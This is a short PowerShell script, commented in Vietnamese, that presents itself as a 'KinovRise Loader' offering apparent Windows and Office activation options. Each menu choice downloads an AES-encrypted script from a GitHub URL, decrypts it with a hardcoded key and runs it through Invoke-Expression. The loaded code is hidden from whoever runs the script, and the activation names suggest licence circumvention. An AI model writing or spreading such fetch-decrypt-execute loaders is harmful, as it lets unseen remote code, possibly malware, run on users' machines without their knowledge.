# obsmcKinovRise.ps1 - Loader giải mã và chạy script mã hoá AES-256
$menu = @(
    @{Name="Active Windows"; EncFile="Active-Windows.enc"},
    @{Name="Active Office";  EncFile="Active-Office.enc"},
    @{Name="KinovRise";      EncFile="KinovRise.enc"}
)
Write-Host "========= KinovRise Loader ========="
for ($i=0; $i -lt $menu.Count; $i++) {
    Write-Host ("[{0}] {1}" -f ($i+1), $menu[$i].Name)
}
$choice = Read-Host "Chọn chức năng (1-${($menu.Count)})"
if ($choice -notmatch '^[1-3]$') { Write-Host "Sai lựa chọn!"; exit }
$encUrl = "https://github.com/ranusTeam41/kinovrise" + $menu[$choice-1].EncFile

$key = "j5rD4N!8xQw@2eTfZlVmAsYuGkLpOiRe" 

try {
    $enc = Invoke-RestMethod -Uri $encUrl
    $raw = [Convert]::FromBase64String($enc)
    $iv = $raw[0..15]
    $data = $raw[16..($raw.Length-1)]
    $aes = [Security.Cryptography.Aes]::Create()
    $aes.Key = [Text.Encoding]::UTF8.GetBytes($key)
    $aes.IV = $iv
    $aes.Mode = "CBC"
    $aes.Padding = "PKCS7"
    $decryptor = $aes.CreateDecryptor()
    $plaintext = $decryptor.TransformFinalBlock($data, 0, $data.Length)
    Invoke-Expression ([Text.Encoding]::UTF8.GetString($plaintext))
} catch {
    Write-Host "Lỗi: Không thể tải hoặc giải mã file script!" -ForegroundColor Red
}
